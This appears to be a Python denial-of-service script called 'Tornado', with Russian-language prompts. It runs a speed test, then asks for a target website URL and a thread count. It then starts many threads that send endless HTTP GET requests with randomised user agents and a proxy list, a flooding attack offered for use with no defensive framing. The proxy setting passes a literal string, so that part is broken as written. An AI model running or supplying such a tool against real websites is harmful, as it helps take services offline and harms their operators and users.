''' _____                                 _
|_   _|  ___   _ __  _ __    __ _   __| |  ___
  | |   / _ \ | '__|| '_ \  / _` | / _` | / _ \
  | |  | (_) || |   | | | || (_| || (_| || (_) |
  |_|   \___/ |_|   |_| |_| \__,_| \__,_| \___/
  '''

import os
import time
import random
import requests
import speedtest
import threading
from art import tprint
from fake_useragent import UserAgent
from termcolor import colored, cprint

global tred

os.system('cls||clear')
tprint('Tornado')
print('Проверяем сокрость вашего интернета')
test = speedtest.Speedtest()
download = test.download()
upload = test.upload()

print(f"Speed: {(download/1024)/1024} Mb/s \nUpload Speed : {(upload/1024)/1024} Mb/s")
time.sleep(2)
os.system('cls||clear')
tprint('Tornado')
ua = UserAgent()
kproxy = sum(1 for line in open('Proxy.txt', 'r'))
print('Всего прокси: ' + str(kproxy))
url = input('Введите ссылку на сайт: ')
tred = int(input('Введите количество потоков: '))


def dos():
    while True:

        try:
            prox = random.choice(list(open('Proxy.txt'))).strip()
            headers = {'User-Agent': ua.random}
            proxies = {'http': 'prox'}
            result = requests.get(url, headers=headers, proxies=proxies)
            print('Good')

        except:
            print('Bad')
        time.sleep(0.2)


for _ in range(tred):
    threading.Thread(target=dos).start()
